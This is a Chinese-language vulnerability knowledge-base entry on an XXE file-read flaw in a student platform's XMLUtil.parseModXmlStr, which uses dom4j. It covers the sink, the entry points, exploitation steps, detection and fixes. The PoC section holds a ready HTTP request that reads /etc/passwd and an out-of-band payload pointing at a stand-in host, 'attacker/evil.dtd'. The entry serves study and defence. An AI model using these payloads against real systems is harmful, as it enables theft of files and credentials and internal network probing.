---
id: web-generic-xxe-dom4j-parsemodxmlstr-inband-read
title: dom4j DocumentHelper.parseText 解析请求 XML：XMLUtil.parseModXmlStr 有回显 XXE 文件读取
type: scenario
domain: web
path: web/generic/xxe
technique: dom4j-parsetext-xxe
tags:
- xxe
- java
- dom4j
- file-read
- xml
- ssi
- authenticated
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V53
  verified_at: '2026-11-05T08:50:37+08:00'
  notes: 已对照原文核对：图21-24确认XMLUtil.parseModXmlStr直接调用DocumentHelper.parseText(xmlStr)，getString仅空值处理；图22确认ShsjScoreController/JxjPdController/QgzxGzController三处调用；图23确认pdSaveView将解析出的xh写入model并返回视图。未验证点：原文未给出XXE payload、回显或OOB证据，标题"有回显"为代码推断（pdSaveView仅把解析结果放入model，是否渲染取决于JSP）；dom4j版本未说明；frontmatter无source_url；未本机复跑。
url: /docs/web/generic/xxe/web-generic-xxe-dom4j-parsemodxmlstr-inband-read/
draft: false
kb_aliases:
- dom4j XXE
- DocumentHelper.parseText XXE
- XMLUtil.parseModXmlStr
- pdSaveView XXE
- 学生平台 XXE
- SAXReader 外部实体
---

## 一句话结论

学生平台的 `XMLUtil.parseModXmlStr(String xmlStr)` 直接调用 dom4j 的 `DocumentHelper.parseText(xmlStr)` 解析请求 XML，未禁用 DOCTYPE/外部实体；调用方（如 `pdSaveView.action`）通过 `getString("xml")` 取请求参数原样传入，攻击者可用外部实体把服务端文件内容读入 XML 元素，再随解析结果输出。

## 原理

- **sink**：`XMLUtil.parseModXmlStr` 中 `Document document = DocumentHelper.parseText(xmlStr);` 然后用 `document.getRootElement()` 与 `elementIterator()` 遍历元素。dom4j 的 `DocumentHelper.parseText` 内部使用 `SAXReader`，默认未调用 `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`，也未关闭 `external-general-entities`/`external-parameter-entities`；因此文档中的 `<!DOCTYPE ... [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` 会被解析器解析，`&xxe;` 被替换为文件内容。
- **入口**：`pdSaveView.action` 中 `String xml = this.getString("xml");` → `XMLUtil.parseModXmlStr(xml)`。`getString` 只是读取 `request.getParameter(name)` 并做空值判断，没有 XML 过滤。同类调用还出现在 `ShsjScoreController:213`、`JxjPdController:154`、`QgzxGzController:329`。
- **回显路径**：解析后的元素文本会被遍历并写入 `List<Map>`、模型或日志（代码中 `logger.info("xmlStr==" + xmlStr)` 还会把原始 XML 打印到日志）；如果业务把解析结果返回页面/JSON，文件内容可被直接读取；无回显时可用 OOB 外带。
- **为什么成立**：XXE 的本质是 XML 解析器允许文档定义外部实体并在解析时读取 SYSTEM 标识的资源；只要 sink 使用默认配置且输入可控，就能把“解析 XML”变成“读取本地文件/发起内网请求”。dom4j 本身不会自动加固，需要调用方显式设置 SAXReader 特性。
- **原文验证边界**：文章通过代码审计定位到 sink 与调用方，称“多处 XXE、内容完全可控”，但未给出 XXE payload、响应截图或 OOB 证据；dom4j 版本也未说明，因此 confidence 记 medium。

## 触发条件

- 目标使用该 `XMLUtil.parseModXmlStr`（dom4j `DocumentHelper.parseText`）解析用户可控 XML。
- 能访问调用它的 Action（原文 `pdSaveView.action` 等）；XGXT 模块的 `SessionFilter` 要求登录态，攻击者需有账号或先获得会话。
- 解析器未禁用 DOCTYPE 与外部实体（默认配置即满足）。
- 有回显（解析结果返回/日志可见）或可出网（OOB）。

## 利用步骤

1. 登录 XGXT（或获得有效 session），确认 `pdSaveView.action` 等入口可访问。
2. 提交 `xml` 参数，内容为带外部实体的 XML；元素中引用实体读取目标文件。
3. 观察响应/页面/日志中是否出现文件内容；无回显时改用外部 DTD 将内容外带到攻击者服务器。
4. 读取应用配置、数据库口令、密钥等；结合内网可达性尝试 `http://` 实体做 SSRF。

## PoC

原文未给出 PoC；按 sink 构造的最小验证载荷（需自行确认 dom4j 版本与入口参数名）：

```http
POST /xgxt/pdSaveView.action HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=<valid>

xml=<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><row><xh>&xxe;</xh></row></root>
```

若解析结果被输出，页面/JSON 中的 `xh` 字段会包含 `/etc/passwd` 内容；无回显时使用 OOB：

```xml
<!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://attacker/evil.dtd"> %dtd;]>
```

## 变体与关联

- 变体：`file://` 读本地文件、`http://` 做 SSRF、`php://filter`（PHP 环境）、FTP 外带；无回显时用参数实体 + 外部 DTD 做 OOB；同一 `parseModXmlStr` 的所有调用方（ShsjScoreController/JxjPdController/QgzxGzController）都可作为入口。
- 关联：`[[web-generic-xxe-inband-file-read-default-insecure]]`（Java XML 解析器默认不安全的总览）；`[[web-java-framework-struts2-s2-069-domhelper-xxe]]`（Struts2 DomHelper 的同类 dom4j XXE）；`[[web-generic-xxe-oob-exfil]]`（盲 XXE 外带）。
- 与 SSRF 的区别：实体解析发生在服务端 XML 解析器内，可读 `file://`；是否能发起内网 HTTP 取决于解析器与网络。

## 检测与防御

- 检测：请求体/参数中出现 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM "file://`、`SYSTEM "http://`；XML 解析耗时异常或对外发起非业务请求；日志中出现被解析器展开的敏感文件内容（如 `root:x:0:0`）；`pdSaveView.action` 等入口的异常 XML。
- 修复：使用 `SAXReader` 并设置 `disallow-doctype-decl=true`、`external-general-entities=false`、`external-parameter-entities=false`，或改用默认安全配置的解析器；对 XML 做结构白名单校验。
- 缓解：WAF 拦截 DOCTYPE/ENTITY；应用出网限制；最小权限运行；敏感文件权限收敛。
